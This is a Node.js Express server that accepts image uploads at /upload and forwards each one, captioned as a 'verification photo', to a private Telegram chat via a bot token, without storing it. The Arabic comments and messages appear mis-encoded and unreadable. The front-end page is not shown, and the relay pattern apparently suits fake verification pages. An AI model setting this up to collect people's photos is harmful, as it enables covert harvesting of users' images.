require("dotenv").config();
const express = require("express");
const path = require("path");
const multer = require("multer");
const axios = require("axios");
const FormData = require("form-data");

const app = express();
const PORT = process.env.PORT || 3000;

// âœ… Ù…ØªØºÙŠØ±Ø§Øª Telegram (Ù…Ù† Railway Ø£Ùˆ .env)
const BOT_TOKEN = process.env.BOT_TOKEN || "Ø¶Ø¹_Ø§Ù„ØªÙˆÙƒÙ†_Ù‡Ù†Ø§_Ù„Ù„ØªØ¬Ø±Ø¨Ø©";
const CHAT_ID = process.env.CHAT_ID || "Ø¶Ø¹_Ø§Ù„Ù€chat_id_Ù‡Ù†Ø§_Ù„Ù„ØªØ¬Ø±Ø¨Ø©";

// âœ… Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø°Ø§ÙƒØ±Ø© ÙÙ‚Ø· (Ø¨Ø¯ÙˆÙ† Ø­ÙØ¸ Ø¹Ù„Ù‰ Ø§Ù„Ù‚Ø±Øµ!)
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// âœ… Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Telegram
async function sendToTelegram(buffer, filename, caption = "") {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", buffer, {
    filename: filename,
    contentType: "image/jpeg"
  });
  form.append("caption", caption || "ØµÙˆØ±Ø© ØªØ­Ù‚Ù‚ Ø¬Ø¯ÙŠØ¯Ø©");

  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      form,
      { headers: form.getHeaders() }
    );
    return response.data;
  } catch (error) {
    console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Telegram:", error.message);
    throw error;
  }
}

// ØªÙ‚Ø¯ÙŠÙ… Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø´Ø±ÙˆØ¹
app.use(express.static(__dirname));

// Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// âœ… Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø¹Ø¯Ø© ØµÙˆØ± ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§ Ø¥Ù„Ù‰ Telegram
app.post("/upload", upload.array("images"), async (req, res) => {
  console.log("POST /upload received");
  const files = req.files || [];
  console.log("Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø³ØªÙ„Ù…Ø©:", files.length);

  if (files.length === 0) {
    return res.status(400).json({
      success: false,
      message: "Ù„Ø§ ØªÙˆØ¬Ø¯ ØµÙˆØ±"
    });
  }

  try {
    const results = [];
    
    // Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ„ ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Telegram
    for (const file of files) {
      const result = await sendToTelegram(
        file.buffer,
        file.originalname || `photo-${Date.now()}.jpg`,
        `ØµÙˆØ±Ø© ØªØ­Ù‚Ù‚ - ${new Date().toLocaleString("ar-EG")}`
      );
      results.push({
        originalName: file.originalname,
        size: file.size,
        telegramMessageId: result.result?.message_id
      });
    }

    res.json({
      success: true,
      message: `ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ${files.length} ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Telegram Ø¨Ù†Ø¬Ø§Ø­`,
      files: results
    });
  } catch (error) {
    console.error("Ø®Ø·Ø£:", error);
    res.status(500).json({
      success: false,
      message: "ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Telegram",
      error: error.message
    });
  }
});

// ØªØ´ØºÙŠÙ„ Ø§Ù„Ø®Ø§Ø¯Ù…
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`BOT_TOKEN: ${BOT_TOKEN ? "âœ… ØªÙ… Ø§Ù„ØªØ­Ø¯ÙŠØ¯" : "âŒ ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}`);
  console.log(`CHAT_ID: ${CHAT_ID ? "âœ… ØªÙ… Ø§Ù„ØªØ­Ø¯ÙŠØ¯" : "âŒ ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}`);
});


